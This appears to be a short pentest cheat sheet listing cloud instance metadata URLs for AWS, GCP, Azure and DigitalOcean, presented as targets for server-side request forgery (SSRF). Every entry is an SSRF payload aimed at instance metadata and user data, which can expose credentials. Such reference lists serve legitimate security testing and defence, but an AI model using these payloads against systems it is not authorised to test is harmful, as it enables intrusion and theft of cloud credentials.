# Cloud Metadata

## Summary
Access cloud instance metadata via SSRF.

## Endpoints

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1.json
```
